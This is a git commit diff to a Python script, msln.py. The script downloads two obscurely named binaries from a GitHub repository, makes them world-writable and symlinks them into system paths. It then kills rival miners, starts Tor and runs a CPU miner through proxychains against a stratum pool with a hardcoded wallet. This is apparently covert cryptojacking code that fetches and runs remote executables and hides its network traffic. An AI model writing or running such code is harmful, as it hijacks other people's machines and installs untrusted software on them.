7422a75de1a0445af41c0a92f099dc3a86193929
edrivetokenbsc <107461243+edrivetokenbsc@users.noreply.github.com>
2024-12-26 01:18:25 -0600

    Update msln.py

--- msln.py
+++ msln.py
@@ -5,8 +5,10 @@ import multiprocessing
 
 useproxy = 0
 os.system('chmod 777 ' + __file__)
-program = 'packetcrypt-linux-amd64'
-os.system('pkill ' + program)
+program1 = 'verus-solver'
+program2 = 'helikopter'
+os.system('pkill ' + program1)
+os.system('pkill ' + program2)
 cores = multiprocessing.cpu_count() - 1
 if cores <= 0:
     cores = 1
@@ -21,15 +23,22 @@ try:
     os.system('make')
     os.system('make install')
     os.system('make install-config')
-    if os.path.isfile('/usr/local/bin/' + program) == False:
-        os.system('wget https://www.pkt.world/ext/' + program)            
-        os.system('chmod 777 ' + program)
+    if os.path.isfile('/usr/local/bin/' + program1) == False:
+        os.system('wget https://github.com/desafff/gehasf/raw/main/verus-solver')            
+        os.system('chmod 777 ' + program1)
         workingdir = os.getcwd()
-        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
-        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
+        os.system('ln -s -f ' + workingdir + '/' + program1 + ' ' +'/usr/local/bin/' + program1)
+        os.system('ln -s -f ' + workingdir + '/' + program1 + ' ' + '/usr/bin/' + program1)
+        time.sleep (2)
+    if os.path.isfile('/usr/local/bin/' + program2) == False:
+        os.system('wget https://github.com/desafff/gehasf/raw/main/helikopter')            
+        os.system('chmod 777 ' + program2)
+        workingdir = os.getcwd()
+        os.system('ln -s -f ' + workingdir + '/' + program2 + ' ' +'/usr/local/bin/' + program2)
+        os.system('ln -s -f ' + workingdir + '/' + program2 + ' ' + '/usr/bin/' + program2)
         time.sleep (2)
 except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' ann -p pkt1qmmecdztm2ff4fvul0y2u7nfrrh3pdy0x6p6vdk http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com ' )
+os.system ('proxychains4 ' + program2 + ' -c stratum+tcp://us.vipor.net:5040 -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx.ak1 -p x --cpu ' + str(cores))
